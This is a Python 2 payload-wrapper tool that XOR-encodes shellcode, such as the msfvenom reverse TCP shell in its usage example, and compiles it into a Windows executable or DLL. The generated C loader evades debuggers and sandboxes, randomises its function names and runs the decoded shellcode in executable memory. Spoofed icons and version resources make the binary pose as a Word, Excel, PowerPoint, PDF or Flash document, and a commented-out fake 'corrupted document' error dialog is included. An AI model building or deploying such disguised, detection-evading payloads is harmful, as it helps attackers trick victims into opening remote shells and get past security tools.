#!/usr/bin/env python2

"""
Vigenere-based self-decoding shellcode wrapper for Windows x86-32 (works fine on x86-64)

Example:
$ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
   2>/dev/null | ./xor-payload.py -p excel

@_hugsy_

Refs:
- https://msdn.microsoft.com/en-us/library/aa381043(v=vs.85).aspx
- MinGW-W64 (apt-get install mingw-w64 first)

Todo:
- add QueueUserAPC code injection technique
"""

import sys
import struct
import random
import tempfile
import os
import subprocess
import argparse

try:
    import capstone
except:
    pass


HEADERS_C_CODE = """
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>
#include <process.h>
#include <sys/types.h>
#include <time.h>
#include <ctype.h>
#include <windows.h>

#define DEBUG
#undef DEBUG

#define BIG_NUMBER 1<<25
"""

STUB_C_CODE = """
DWORD WINAPI SpawnShellcode(LPVOID lpFuncPointer)
{
  __asm__("movl %0, %%eax\\n\\t"
          "call %%eax"
          : : "r"(lpFuncPointer) : "%eax");
  return 0;
}


int CheckNtGlobalFlag()
{
  char *peb;
  unsigned int *flag;
  asm ("xor %%eax, %%eax;"
       "movl %%fs:%p1, %%eax;"
       "movl %%eax, %0;"
       : "=r" (peb)
       : "i"(48)
       : "%eax" );
  flag = peb+0x68;
  return *flag & 0x70;
}


LPVOID AllocAndMap(unsigned char* sc, DWORD dwBytesToRead)
{
  LPVOID code;
  DWORD  dwBytesRead;
  DWORD  dwAllocSize;
  SYSTEM_INFO siSysInfo;

  GetSystemInfo(&siSysInfo);
  dwAllocSize = siSysInfo.dwPageSize > dwBytesToRead ? siSysInfo.dwPageSize : dwBytesToRead;

  code = VirtualAlloc(NULL, dwAllocSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (!code) {
#ifdef DEBUG
    printf("[-] VirtualAlloc\\n");
#endif
    return NULL;
  }

  code = memcpy(code, sc, dwBytesToRead);
  return code;
}


void DecodeShellcode(unsigned char* code, int len)
{
  unsigned long i,j;
  for(j=BIG_NUMBER; j; j--){}
  for(i=0; i<len; i++){code[i] ^= key++; key %= 256;}
  for(j=BIG_NUMBER; j; j--){}
  return;
}

"""

TEMPLATE_C_CODE = """
  int len = sizeof(encoded_shellcode);
  DWORD pID;
  LPVOID code;
  DWORD lpflOldProtect;
  HANDLE hdlThread, hdlMutex;
  BOOL IsDbgPresent = FALSE;
  int retcode;

  IsDbgPresent = IsDebuggerPresent();
  if(IsDbgPresent)
    exit(1);

  if(CheckNtGlobalFlag())
    exit(1);

  hdlMutex = CreateMutex(NULL, TRUE, _T("Ipc::Critical::DontRemove"));
  if(!hdlMutex)
    exit(1);

  CloseHandle(hdlMutex);

  SetErrorMode(1024);
  if (SetErrorMode(0) != 1024)
    exit(1);

  code = AllocAndMap(encoded_shellcode, len);
  if (!code) exit(3);

#ifdef DEBUG
  printf("[+] Shellcode alloc-ed at %p\\n", code);
#endif

#ifdef DEBUG
  printf("[+] Decoding using key=%#x\\n", key);
#endif
  DecodeShellcode(code, len);

  if(!VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){
#ifdef DEBUG
    printf("[-] failed to set 0x%p as executable\\n", code);
#endif
    VirtualFree(code, len, MEM_RELEASE);
    exit(4);
  }
#ifdef DEBUG
  printf("[+] Page %p set as executable\\n", code);
  printf("[+] Detaching from console and triggering shellcode\\n");
  FreeConsole();
#endif

  FlushInstructionCache(GetCurrentProcess(), code, len);
  hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);

  WaitForSingleObject(hdlThread, INFINITE);
  VirtualFree(code, len, MEM_RELEASE);
  """

TEMPLATE_WIN32_CODE = """
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
/*
  MessageBoxA(NULL,
  "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
  "If this happened for the first time, try re-opening the document."
  "\\n\\nError code: 0xffffff96"
  ,
  "Windows Error",
  MB_ICONERROR | MB_OK);
*/
""" + TEMPLATE_C_CODE + """

  return retcode;
}
"""

TEMPLATE_EXE_CODE = """
int main(int argc, char** argv, char** envp)
{
/*
  MessageBoxA(NULL,
  "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
  "If this happened for the first time, try re-opening the document."
  "\\n\\nError code: 0xffffff96"
  ,
  "Windows Error",
  MB_ICONERROR | MB_OK);
*/
""" + TEMPLATE_C_CODE + """

  return retcode;
}
"""

TEMPLATE_DLL_CODE = """
void __declspec(dllexport) ControlRun(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
""" + TEMPLATE_C_CODE + """

return;
}
"""

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
WORDS_TO_OBFUSCATE = [ "SpawnShellcode", "AllocAndMap", "DecodeShellcode", "CheckNtGlobalFlag", ]


def generate_random_word():
    length = random.randint(8, 20)
    w = [random.choice(CHARSET) for i in range(length)]
    return ''.join(w)


def obfuscate(fname):
    assoc = {}
    data = open(fname).read()

    for w in WORDS_TO_OBFUSCATE:
        while True:
            nw = generate_random_word()
            if nw not in assoc.values():
                assoc[w] = nw
                break

    for k in assoc:
        data = data.replace(k, assoc[k])

    with open(fname, 'w') as f:
        f.write(data)

    return True


def echo(fd, m):
    os.write(fd, m.encode("utf-8"))
    return


def create_application_manifest():
    with open("/tmp/Application.manifest", "w") as f:
        f.write("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
 <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
  <security>
   <requestedPrivileges>
    <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
   </requestedPrivileges>
  </security>
 </trustInfo>
 <dependency>
  <dependentAssembly>
   <assemblyIdentity type="Win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0"
             processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/>
  </dependentAssembly>
 </dependency>
</assembly>""")
    return


def create_resource_file( profile_index ):
    global PROFILES

    create_application_manifest()

    prof = PROFILES[ profile_index ]
    fd, cname = tempfile.mkstemp(suffix=".rc")
    with os.fdopen(fd, 'w') as f:
        f.write("""id ICON "{0}"
CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST "/tmp/Application.manifest"
1 VERSIONINFO
FILEVERSION      {1}
PRODUCTVERSION   {1}
FILEFLAGS        0
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "080904E4"
    BEGIN
      VALUE "CompanyName", "{2}"
      VALUE "FileDescription", "{3}"
      VALUE "FileVersion", "{1}"
      VALUE "InternalName", "{4}"
      VALUE "LegalCopyright", "{5}"
      VALUE "OriginalFilename", "{6}"
      VALUE "ProductName", "{4}"
      VALUE "ProductVersion", "1.0"
    END
  END

  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x809, 1252
  END
END
""".format(*prof))
    return cname


def get_shellcode_from_stdin():
    sc = []
    while True:
        c = sys.stdin.read(1)
        if len(c) == 0:
            break
        sc.append(c)
    return sc


def generate_code_file(fd, key, template="win32", show_disass=False):
    sc = get_shellcode_from_stdin()

    echo(fd, """/**\n * Vigenere encoding shellcode with key '%x'\n""" % (key,))
    echo(fd, """ * Generated by %s\n**/\n\n""" % (sys.argv[0],))

    echo(fd, HEADERS_C_CODE)
    echo(fd, "unsigned char key = %d;\n" % key)

    if show_disass:
        echo(fd, "unsigned char decoded_shellcode[]={\n")
        eng = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
        for insn in eng.disasm(''.join(sc), 0x1000):
            echo(fd, """\t%-60s ;; %s\t%s\n""" % ('"'+''.join(["\\x%02x" % i for i in insn.bytes])+'"' , insn.mnemonic, insn.op_str))
        echo(fd, "};\n\n")

    echo(fd, 'unsigned char encoded_shellcode[]=\n')
    echo(fd, '"')
    i = 1
    for c in sc:
        a = ord(c) ^ key
        echo(fd, "\\x%.2x" % a)
        if i % 15 == 0:
            echo(fd, '"\n')
            echo(fd, '"')
        i += 1
        key = (key + 1)%256
    echo(fd, '";\n')

    echo(fd, STUB_C_CODE)

    if template == "win32":
        echo(fd, TEMPLATE_WIN32_CODE)
    elif template == "exe":
        echo(fd, TEMPLATE_EXE_CODE)
    elif template == "dll":
        echo(fd, TEMPLATE_DLL_CODE)

    os.close(fd)
    return


if __name__ == "__main__":
    res_o = ""
    available_profiles = ["powerpoint", "excel", "word", "flash", "pdf",]
    HOME = os.getenv("HOME")

    parser = argparse.ArgumentParser(description="Yet another payload encoder")
    parser.add_argument("-p", "--profile", default=None, metavar="PROFILE",
                        help="Specify the profile to use ({})".format(available_profiles))
    parser.add_argument("-q", "--quiet", action="store_true", help="Disable verbose output", default=False)
    parser.add_argument("-o", "--output", default=None, help="Specify an output file")
    parser.add_argument("--dll", default=False, action="store_true", help="Generate a DLL")
    parser.add_argument("--exe", default=False, action="store_true", help="Generate a PE Console")
    parser.add_argument("--win32", default=True, action="store_true", help="Generate a PE GUI (default)")
    parser.add_argument("--icons-path", default="./icons/", dest="ico", help="Specify path to icons/ directory")
    parser.add_argument("--no-compile", default=False, dest="no_compile", action="store_true", help="If set, only the C file will be generated.")

    args = parser.parse_args()

    if args.profile is not None and args.profile not in available_profiles:
        print("[-] Invalid profile")
        sys.exit(1)

    args.ico = os.path.realpath(args.ico)

    PROFILES = {
        # index : [Version, /path/to/ico, CompanyName, Description, Name, CopyrightName]
        "powerpoint":   [args.ico+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
        "word":         [args.ico+"/word.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Word document", "Word", "Microsoft Word", "word.exe", ".docx"],
        "excel":        [args.ico+"/excel.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Excel document", "Excel", "Microsoft Excel", "excel.exe", ".xlsx"],
        "flash":        [args.ico+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
        "pdf":          [args.ico+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
    }

    if not args.quiet:
        print ("[+] Getting random offset")

    key = random.randint(0,255)
    fd, cname = tempfile.mkstemp(suffix=".c")

    if args.no_compile and "capstone" in sys.modules:
        show_disass = True
    else:
        show_disass = False

    if args.exe:
        generate_code_file(fd, key, "exe", show_disass=show_disass)
    elif args.dll:
        generate_code_file(fd, key, "dll", show_disass=show_disass)
    else:
        generate_code_file(fd, key, "win32", show_disass=show_disass)

    if not args.quiet:
        print ("[+] Generating code in '{}'".format(cname))

    if args.no_compile:
        if args.quiet:
            print("{}".format(cname))
        sys.exit(0)

    if not args.quiet:
        print ("[+] Obfuscating '{}'".format(cname))

    obfuscate(cname)

    if args.profile is not None and not args.dll:
        if not args.quiet:
            print("[+] Using profile %s" % args.profile.title())
            resfile = create_resource_file( args.profile )
            res_o = "/tmp/res.o"
            cmd = "i686-w64-mingw32-windres {} -O coff -o {}".format(resfile, res_o)

        if not args.quiet:
            print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
            ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
            os.unlink(resfile)
    else:
        if not args.quiet:
            print("[+] Profile ignored")


    suffix = PROFILES[ args.profile ][7] if args.profile is not None else ""

    if args.output is None:
        if args.dll:
            f, ename = tempfile.mkstemp(suffix=suffix + ".dll")
        else:
            f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
            os.close(f)
    else:
        ename = args.output

    if args.dll:
        cmd = "i686-w64-mingw32-gcc {0} -shared -o {1}  -Wl,--out-implib,{1}.a".format(cname, ename)
    elif args.exe:
        cmd = "i686-w64-mingw32-gcc {} {} -o {}".format(cname, res_o, ename)
    else:
        cmd = "i686-w64-mingw32-gcc -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(cname, res_o, ename)

    if not args.quiet:
        print("[+] Compiling '{}'->'{}'".format(cname, ename))

    ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)

    if not args.quiet:
        print("[+] Generation completed '{}', removing resources...".format(ename))

        if args.profile is not None:
            os.unlink(res_o)
            if not args.dll:
                os.unlink("/tmp/Application.manifest")

    os.unlink(cname)
    if args.dll:
        os.unlink(ename + ".a")

    if not args.quiet:
        print("[+] Success")

    if args.quiet:
        print("{}".format(ename))

    sys.stdout.flush()
    sys.stderr.flush()
    sys.exit(0)
